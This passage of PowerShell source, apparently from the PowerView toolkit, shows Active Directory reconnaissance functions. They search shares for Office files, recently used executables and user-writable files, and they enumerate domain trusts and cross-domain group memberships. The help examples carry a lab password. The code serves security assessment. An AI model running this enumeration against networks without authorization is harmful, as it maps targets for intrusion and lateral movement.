        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $LastAccessTime,

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $LastWriteTime,

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $CreationTime,

        [Parameter(ParameterSetName = 'OfficeDocs')]
        [Switch]
        $OfficeDocs,

        [Parameter(ParameterSetName = 'FreshEXEs')]
        [Switch]
        $FreshEXEs,

        [Parameter(ParameterSetName = 'FileSpecification')]
        [Switch]
        $ExcludeFolders,

        [Parameter(ParameterSetName = 'FileSpecification')]
        [Switch]
        $ExcludeHidden,

        [Switch]
        $CheckWriteAccess,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $SearcherArguments =  @{
            'Recurse' = $True
            'ErrorAction' = 'SilentlyContinue'
            'Include' = $Include
        }
        if ($PSBoundParameters['OfficeDocs']) {
            $SearcherArguments['Include'] = @('*.doc', '*.docx', '*.xls', '*.xlsx', '*.ppt', '*.pptx')
        }
        elseif ($PSBoundParameters['FreshEXEs']) {
            # find .exe's accessed within the last 7 days
            $LastAccessTime = (Get-Date).AddDays(-7).ToString('MM/dd/yyyy')
            $SearcherArguments['Include'] = @('*.exe')
        }
        $SearcherArguments['Force'] = -not $PSBoundParameters['ExcludeHidden']

        $MappedComputers = @{}

        function Test-Write {
            # short helper to check is the current user can write to a file
            [CmdletBinding()]Param([String]$Path)
            try {
                $Filetest = [IO.File]::OpenWrite($Path)
                $Filetest.Close()
                $True
            }
            catch {
                $False
            }
        }
    }

    PROCESS {
        ForEach ($TargetPath in $Path) {
            if (($TargetPath -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                $HostComputer = (New-Object System.Uri($TargetPath)).Host
                if (-not $MappedComputers[$HostComputer]) {
                    # map IPC$ to this computer if it's not already
                    Add-RemoteConnection -ComputerName $HostComputer -Credential $Credential
                    $MappedComputers[$HostComputer] = $True
                }
            }

            $SearcherArguments['Path'] = $TargetPath
            Get-ChildItem @SearcherArguments | ForEach-Object {
                # check if we're excluding folders
                $Continue = $True
                if ($PSBoundParameters['ExcludeFolders'] -and ($_.PSIsContainer)) {
                    Write-Verbose "Excluding: $($_.FullName)"
                    $Continue = $False
                }
                if ($LastAccessTime -and ($_.LastAccessTime -lt $LastAccessTime)) {
                    $Continue = $False
                }
                if ($PSBoundParameters['LastWriteTime'] -and ($_.LastWriteTime -lt $LastWriteTime)) {
                    $Continue = $False
                }
                if ($PSBoundParameters['CreationTime'] -and ($_.CreationTime -lt $CreationTime)) {
                    $Continue = $False
                }
                if ($PSBoundParameters['CheckWriteAccess'] -and (-not (Test-Write -Path $_.FullName))) {
                    $Continue = $False
                }
                if ($Continue) {
                    $FileParams = @{
                        'Path' = $_.FullName
                        'Owner' = $((Get-Acl $_.FullName).Owner)
                        'LastAccessTime' = $_.LastAccessTime
                        'LastWriteTime' = $_.LastWriteTime
                        'CreationTime' = $_.CreationTime
                        'Length' = $_.Length
                    }
                    $FoundFile = New-Object -TypeName PSObject -Property $FileParams
                    $FoundFile.PSObject.TypeNames.Insert(0, 'PowerView.FoundFile')
                    $FoundFile
                }
            }
        }
    }

    END {
        # remove the IPC$ mappings
        $MappedComputers.Keys | Remove-RemoteConnection
    }
}

function Get-DomainTrust {
<#
.SYNOPSIS

Return all domain trusts for the current domain or a specified domain.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-Domain, Get-DomainSearcher, Get-DomainSID, PSReflect  

.DESCRIPTION

This function will enumerate domain trust relationships for the current (or a remote)
domain using a number of methods. By default, the .NET method GetAllTrustRelationships()
is used on the System.DirectoryServices.ActiveDirectory.Domain object. If the -LDAP flag
is specified, or any of the LDAP-appropriate parameters, an LDAP search using the filter
'(objectClass=trustedDomain)' is used instead. If the -API flag is specified, the
Win32 API DsEnumerateDomainTrusts() call is used to enumerate instead.

.PARAMETER Domain

Specifies the domain to query for trusts, defaults to the current domain.

.PARAMETER API

Switch. Use an API call (DsEnumerateDomainTrusts) to enumerate the trusts instead of the built-in
.NET methods.

.PARAMETER LDAP

Switch. Use LDAP queries to enumerate the trusts instead of direct domain connections.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER Properties

Specifies the properties of the output object to retrieve from the server.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER FindOne

Only return one result object.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainTrust

Return domain trusts for the current domain using built in .NET methods.

.EXAMPLE

Get-DomainTrust -Domain "prod.testlab.local"

Return domain trusts for the "prod.testlab.local" domain using .NET methods

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainTrust -LDAP -Domain "prod.testlab.local" -Server "PRIMARY.testlab.local" -Credential $Cred

Return domain trusts for the "prod.testlab.local" domain enumerated through LDAP
queries, binding to the PRIMARY.testlab.local server for queries, and using the specified
alternate credenitals.

.EXAMPLE

Get-DomainTrust -API -Domain "prod.testlab.local"

Return domain trusts for the "prod.testlab.local" domain enumerated through API calls.

.OUTPUTS

PowerView.DomainTrust.NET

A TrustRelationshipInformationCollection returned when using .NET methods (default).

PowerView.DomainTrust.LDAP

Custom PSObject with translated domain LDAP trust result fields.

PowerView.DomainTrust.API

Custom PSObject with translated domain API trust result fields.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DomainTrust.NET')]
    [OutputType('PowerView.DomainTrust.LDAP')]
    [OutputType('PowerView.DomainTrust.API')]
    [CmdletBinding(DefaultParameterSetName = 'NET')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Parameter(ParameterSetName = 'API')]
        [Switch]
        $API,

        [Parameter(ParameterSetName = 'LDAP')]
        [Switch]
        $LDAP,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [Parameter(ParameterSetName = 'LDAP')]
        [Parameter(ParameterSetName = 'API')]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Parameter(ParameterSetName = 'LDAP')]
        [Switch]
        $Tombstone,

        [Alias('ReturnOne')]
        [Switch]
        $FindOne,

        [Parameter(ParameterSetName = 'LDAP')]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $TrustAttributes = @{
            [uint32]'0x00000001' = 'non_transitive'
            [uint32]'0x00000002' = 'uplevel_only'
            [uint32]'0x00000004' = 'quarantined_domain'
            [uint32]'0x00000008' = 'forest_transitive'
            [uint32]'0x00000010' = 'cross_organization'
            [uint32]'0x00000020' = 'within_forest'
            [uint32]'0x00000040' = 'treat_as_external'
            [uint32]'0x00000080' = 'trust_uses_rc4_encryption'
            [uint32]'0x00000100' = 'trust_uses_aes_keys'
            [uint32]'0x00000200' = 'cross_organization_no_tgt_delegation'
            [uint32]'0x00000400' = 'pim_trust'
        }

        $LdapSearcherArguments = @{}
        if ($PSBoundParameters['LDAPFilter']) { $LdapSearcherArguments['LDAPFilter'] = $LDAPFilter }
        if ($PSBoundParameters['Properties']) { $LdapSearcherArguments['Properties'] = $Properties }
        if ($PSBoundParameters['SearchBase']) { $LdapSearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $LdapSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $LdapSearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $LdapSearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $LdapSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $LdapSearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $LdapSearcherArguments['Credential'] = $Credential }
    }

    PROCESS {
        if ($PsCmdlet.ParameterSetName -ne 'API') {
            $NetSearcherArguments = @{}
            if ($Domain -and $Domain.Trim() -ne '') {
                $SourceDomain = $Domain
            }
            else {
                if ($PSBoundParameters['Credential']) {
                    $SourceDomain = (Get-Domain -Credential $Credential).Name
                }
                else {
                    $SourceDomain = (Get-Domain).Name
                }
            }

            $NetSearcherArguments['Domain'] = $SourceDomain
            if ($PSBoundParameters['Credential']) { $NetSearcherArguments['Credential'] = $Credential }
        }
        else {
            if ($Domain -and $Domain.Trim() -ne '') {
                $SourceDomain = $Domain
            }
            else {
                $SourceDomain = $Env:USERDNSDOMAIN
            }
        }

        if ($PsCmdlet.ParameterSetName -eq 'LDAP') {
            # if we're searching for domain trusts through LDAP/ADSI
            $TrustSearcher = Get-DomainSearcher @LdapSearcherArguments
            $SourceSID = Get-DomainSID @NetSearcherArguments

            if ($TrustSearcher) {

                $TrustSearcher.Filter = '(objectClass=trustedDomain)'

                if ($PSBoundParameters['FindOne']) { $Results = $TrustSearcher.FindOne() }
                else { $Results = $TrustSearcher.FindAll() }
                $Results | Where-Object {$_} | ForEach-Object {
                    $Props = $_.Properties
                    $DomainTrust = New-Object PSObject

                    $TrustAttrib = @()
                    $TrustAttrib += $TrustAttributes.Keys | Where-Object { $Props.trustattributes[0] -band $_ } | ForEach-Object { $TrustAttributes[$_] }

                    $Direction = Switch ($Props.trustdirection) {
                        0 { 'Disabled' }
                        1 { 'Inbound' }
                        2 { 'Outbound' }
                        3 { 'Bidirectional' }
                    }

                    $ObjectGuid = New-Object Guid @(,$Props.objectguid[0])
                    $TargetSID = (New-Object System.Security.Principal.SecurityIdentifier($Props.securityidentifier[0],0)).Value

                    $DomainTrust | Add-Member Noteproperty 'SourceName' $SourceDomain
                    $DomainTrust | Add-Member Noteproperty 'SourceSID' $SourceSID
                    $DomainTrust | Add-Member Noteproperty 'TargetName' $Props.name[0]
                    $DomainTrust | Add-Member Noteproperty 'TargetSID' $TargetSID
                    $DomainTrust | Add-Member Noteproperty 'ObjectGuid' "{$ObjectGuid}"
                    $DomainTrust | Add-Member Noteproperty 'TrustType' $($TrustAttrib -join ',')
                    $DomainTrust | Add-Member Noteproperty 'TrustDirection' "$Direction"
                    $DomainTrust.PSObject.TypeNames.Insert(0, 'PowerView.DomainTrust.LDAP')
                    $DomainTrust
                }
                if ($Results) {
                    try { $Results.dispose() }
                    catch {
                        Write-Verbose "[Get-DomainTrust] Error disposing of the Results object: $_"
                    }
                }
                $TrustSearcher.dispose()
            }
        }
        elseif ($PsCmdlet.ParameterSetName -eq 'API') {
            # if we're searching for domain trusts through Win32 API functions
            if ($PSBoundParameters['Server']) {
                $TargetDC = $Server
            }
            elseif ($Domain -and $Domain.Trim() -ne '') {
                $TargetDC = $Domain
            }
            else {
                # see https://msdn.microsoft.com/en-us/library/ms675976(v=vs.85).aspx for default NULL behavior
                $TargetDC = $Null
            }

            # arguments for DsEnumerateDomainTrusts
            $PtrInfo = [IntPtr]::Zero

            # 63 = DS_DOMAIN_IN_FOREST + DS_DOMAIN_DIRECT_OUTBOUND + DS_DOMAIN_TREE_ROOT + DS_DOMAIN_PRIMARY + DS_DOMAIN_NATIVE_MODE + DS_DOMAIN_DIRECT_INBOUND
            $Flags = 63
            $DomainCount = 0

            # get the trust information from the target server
            $Result = $Netapi32::DsEnumerateDomainTrusts($TargetDC, $Flags, [ref]$PtrInfo, [ref]$DomainCount)

            # Locate the offset of the initial intPtr
            $Offset = $PtrInfo.ToInt64()

            # 0 = success
            if (($Result -eq 0) -and ($Offset -gt 0)) {

                # Work out how much to increment the pointer by finding out the size of the structure
                $Increment = $DS_DOMAIN_TRUSTS::GetSize()

                # parse all the result structures
                for ($i = 0; ($i -lt $DomainCount); $i++) {
                    # create a new int ptr at the given offset and cast the pointer as our result structure
                    $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
                    $Info = $NewIntPtr -as $DS_DOMAIN_TRUSTS

                    $Offset = $NewIntPtr.ToInt64()
                    $Offset += $Increment

                    $SidString = ''
                    $Result = $Advapi32::ConvertSidToStringSid($Info.DomainSid, [ref]$SidString);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                    if ($Result -eq 0) {
                        Write-Verbose "[Get-DomainTrust] Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
                    }
                    else {
                        $DomainTrust = New-Object PSObject
                        $DomainTrust | Add-Member Noteproperty 'SourceName' $SourceDomain
                        $DomainTrust | Add-Member Noteproperty 'TargetName' $Info.DnsDomainName
                        $DomainTrust | Add-Member Noteproperty 'TargetNetbiosName' $Info.NetbiosDomainName
                        $DomainTrust | Add-Member Noteproperty 'Flags' $Info.Flags
                        $DomainTrust | Add-Member Noteproperty 'ParentIndex' $Info.ParentIndex
                        $DomainTrust | Add-Member Noteproperty 'TrustType' $Info.TrustType
                        $DomainTrust | Add-Member Noteproperty 'TrustAttributes' $Info.TrustAttributes
                        $DomainTrust | Add-Member Noteproperty 'TargetSid' $SidString
                        $DomainTrust | Add-Member Noteproperty 'TargetGuid' $Info.DomainGuid
                        $DomainTrust.PSObject.TypeNames.Insert(0, 'PowerView.DomainTrust.API')
                        $DomainTrust
                    }
                }
                # free up the result buffer
                $Null = $Netapi32::NetApiBufferFree($PtrInfo)
            }
            else {
                Write-Verbose "[Get-DomainTrust] Error: $(([ComponentModel.Win32Exception] $Result).Message)"
            }
        }
        else {
            # if we're searching for domain trusts through .NET methods
            $FoundDomain = Get-Domain @NetSearcherArguments
            if ($FoundDomain) {
                $FoundDomain.GetAllTrustRelationships() | ForEach-Object {
                    $_.PSObject.TypeNames.Insert(0, 'PowerView.DomainTrust.NET')
                    $_
                }
            }
        }
    }
}

function Get-DomainForeignUser {
<#
.SYNOPSIS

Enumerates users who are in groups outside of the user's domain.
This is a domain's "outgoing" access.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-Domain, Get-DomainUser  

.DESCRIPTION

Uses Get-DomainUser to enumerate all users for the current (or target) domain,
then calculates the given user's domain name based on the user's distinguishedName.
This domain name is compared to the queried domain, and the user object is
output if they differ.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER Properties

Specifies the properties of the output object to retrieve from the server.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER SecurityMasks

Specifies an option for examining security information of a directory object.
One of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainForeignUser

Return all users in the current domain who are in groups not in the
current domain.

.EXAMPLE

Get-DomainForeignUser -Domain dev.testlab.local

Return all users in the dev.testlab.local domain who are in groups not in the
dev.testlab.local domain.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainForeignUser -Domain dev.testlab.local -Server secondary.dev.testlab.local -Credential $Cred

Return all users in the dev.testlab.local domain who are in groups not in the
dev.testlab.local domain, binding to the secondary.dev.testlab.local for queries, and
using the specified alternate credentials.

.OUTPUTS

PowerView.ForeignUser

Custom PSObject with translated user property fields.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ForeignUser')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $SearcherArguments = @{}
        $SearcherArguments['LDAPFilter'] = '(memberof=*)'
        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        if ($PSBoundParameters['Raw']) { $SearcherArguments['Raw'] = $Raw }
    }

    PROCESS {
        if ($PSBoundParameters['Domain']) {
            $SearcherArguments['Domain'] = $Domain
            $TargetDomain = $Domain
        }
        elseif ($PSBoundParameters['Credential']) {
            $TargetDomain = Get-Domain -Credential $Credential | Select-Object -ExpandProperty name
        }
        elseif ($Env:USERDNSDOMAIN) {
            $TargetDomain = $Env:USERDNSDOMAIN
        }
        else {
            throw "[Get-DomainForeignUser] No domain found to enumerate!"
        }

        Get-DomainUser @SearcherArguments  | ForEach-Object {
            ForEach ($Membership in $_.memberof) {
                $Index = $Membership.IndexOf('DC=')
                if ($Index) {

                    $GroupDomain = $($Membership.SubString($Index)) -replace 'DC=','' -replace ',','.'

                    if ($GroupDomain -ne $TargetDomain) {
                        # if the group domain doesn't match the user domain, display it
                        $GroupName = $Membership.Split(',')[0].split('=')[1]
                        $ForeignUser = New-Object PSObject
                        $ForeignUser | Add-Member Noteproperty 'UserDomain' $TargetDomain
                        $ForeignUser | Add-Member Noteproperty 'UserName' $_.samaccountname
                        $ForeignUser | Add-Member Noteproperty 'UserDistinguishedName' $_.distinguishedname
                        $ForeignUser | Add-Member Noteproperty 'GroupDomain' $GroupDomain
                        $ForeignUser | Add-Member Noteproperty 'GroupName' $GroupName
                        $ForeignUser | Add-Member Noteproperty 'GroupDistinguishedName' $Membership
                        $ForeignUser.PSObject.TypeNames.Insert(0, 'PowerView.ForeignUser')
                        $ForeignUser
                    }
                }
            }
        }
    }
}

function Get-DomainForeignGroupMember {
<#
.SYNOPSIS

Enumerates groups with users outside of the group's domain and returns
each foreign member. This is a domain's "incoming" access.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-Domain, Get-DomainGroup  

.DESCRIPTION

Uses Get-DomainGroup to enumerate all groups for the current (or target) domain,
then enumerates the members of each group, and compares the member's domain
name to the parent group's domain name, outputting the member if the domains differ.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER Properties

Specifies the properties of the output object to retrieve from the server.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER SecurityMasks

Specifies an option for examining security information of a directory object.
One of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainForeignGroupMember

Return all group members in the current domain where the group and member differ.

.EXAMPLE

Get-DomainForeignGroupMember -Domain dev.testlab.local

Return all group members in the dev.testlab.local domain where the member is not in dev.testlab.local.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainForeignGroupMember -Domain dev.testlab.local -Server secondary.dev.testlab.local -Credential $Cred

Return all group members in the dev.testlab.local domain where the member is
not in dev.testlab.local. binding to the secondary.dev.testlab.local for
queries, and using the specified alternate credentials.

.OUTPUTS

PowerView.ForeignGroupMember

Custom PSObject with translated group member property fields.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ForeignGroupMember')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $SearcherArguments = @{}
        $SearcherArguments['LDAPFilter'] = '(member=*)'
        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        if ($PSBoundParameters['Raw']) { $SearcherArguments['Raw'] = $Raw }
    }

    PROCESS {
        if ($PSBoundParameters['Domain']) {
            $SearcherArguments['Domain'] = $Domain
            $TargetDomain = $Domain
        }
        elseif ($PSBoundParameters['Credential']) {
            $TargetDomain = Get-Domain -Credential $Credential | Select-Object -ExpandProperty name
        }
        elseif ($Env:USERDNSDOMAIN) {
            $TargetDomain = $Env:USERDNSDOMAIN
        }
        else {
            throw "[Get-DomainForeignGroupMember] No domain found to enumerate!"
        }

        # standard group names to ignore
        $ExcludeGroups = @('Users', 'Domain Users', 'Guests')
        $DomainDN = "DC=$($TargetDomain.Replace('.', ',DC='))"

        Get-DomainGroup @SearcherArguments | Where-Object {$ExcludeGroups -notcontains $_.samaccountname} | ForEach-Object {
            $GroupName = $_.samAccountName
            $GroupDistinguishedName = $_.distinguishedname

            $_.member | ForEach-Object {
                # filter for foreign SIDs in the cn field for users in another domain,
                #   or if the DN doesn't end with the proper DN for the queried domain
                if (($_ -match 'CN=S-1-5-21.*-.*') -or ($DomainDN -ne ($_.SubString($_.IndexOf('DC='))))) {

                    $MemberDistinguishedName = $_
                    $MemberDomain = $_.SubString($_.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                    $MemberName = $_.Split(',')[0].split('=')[1]

                    $ForeignGroupMember = New-Object PSObject
                    $ForeignGroupMember | Add-Member Noteproperty 'GroupDomain' $TargetDomain
                    $ForeignGroupMember | Add-Member Noteproperty 'GroupName' $GroupName
                    $ForeignGroupMember | Add-Member Noteproperty 'GroupDistinguishedName' $GroupDistinguishedName
                    $ForeignGroupMember | Add-Member Noteproperty 'MemberDomain' $MemberDomain
                    $ForeignGroupMember | Add-Member Noteproperty 'MemberName' $MemberName
                    $ForeignGroupMember | Add-Member Noteproperty 'MemberDistinguishedName' $MemberDistinguishedName
                    $ForeignGroupMember.PSObject.TypeNames.Insert(0, 'PowerView.ForeignGroupMember')
                    $ForeignGroupMember
                }
            }
        }
    }
}

########################################################
#
# Expose the Win32API functions and datastructures below
# using PSReflect.
# Warning: Once these are executed, they are baked in
# and can't be changed while the script is running!
#
########################################################

$Mod = New-InMemoryModule -ModuleName Win32

# [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPositionalParameters', Scope='Function', Target='psenum')]

# used to parse the 'samAccountType' property for users/computers/groups
$SamAccountTypeEnum = psenum $Mod PowerView.SamAccountTypeEnum UInt32 @{
    DOMAIN_OBJECT                   =   '0x00000000'
    GROUP_OBJECT                    =   '0x10000000'
    NON_SECURITY_GROUP_OBJECT       =   '0x10000001'
    ALIAS_OBJECT                    =   '0x20000000'
    NON_SECURITY_ALIAS_OBJECT       =   '0x20000001'
    USER_OBJECT                     =   '0x30000000'
    MACHINE_ACCOUNT                 =   '0x30000001'
    TRUST_ACCOUNT                   =   '0x30000002'
    APP_BASIC_GROUP                 =   '0x40000000'
    APP_QUERY_GROUP                 =   '0x40000001'
    ACCOUNT_TYPE_MAX                =   '0x7fffffff'
}

# used to parse the 'grouptype' property for groups
$GroupTypeEnum = psenum $Mod PowerView.GroupTypeEnum UInt32 @{
    CREATED_BY_SYSTEM               =   '0x00000001'
    GLOBAL_SCOPE                    =   '0x00000002'
    DOMAIN_LOCAL_SCOPE              =   '0x00000004'
    UNIVERSAL_SCOPE                 =   '0x00000008'
    APP_BASIC                       =   '0x00000010'
    APP_QUERY                       =   '0x00000020'
    SECURITY                        =   '0x80000000'
} -Bitfield

# used to parse the 'userAccountControl' property for users/groups
$UACEnum = psenum $Mod PowerView.UACEnum UInt32 @{
    SCRIPT                          =   1
    ACCOUNTDISABLE                  =   2
    HOMEDIR_REQUIRED                =   8
    LOCKOUT                         =   16
    PASSWD_NOTREQD                  =   32
    PASSWD_CANT_CHANGE              =   64
    ENCRYPTED_TEXT_PWD_ALLOWED      =   128
    TEMP_DUPLICATE_ACCOUNT          =   256
    NORMAL_ACCOUNT                  =   512
    INTERDOMAIN_TRUST_ACCOUNT       =   2048
    WORKSTATION_TRUST_ACCOUNT       =   4096
    SERVER_TRUST_ACCOUNT            =   8192
    DONT_EXPIRE_PASSWORD            =   65536
    MNS_LOGON_ACCOUNT               =   131072
    SMARTCARD_REQUIRED              =   262144
    TRUSTED_FOR_DELEGATION          =   524288
    NOT_DELEGATED                   =   1048576
    USE_DES_KEY_ONLY                =   2097152
    DONT_REQ_PREAUTH                =   4194304
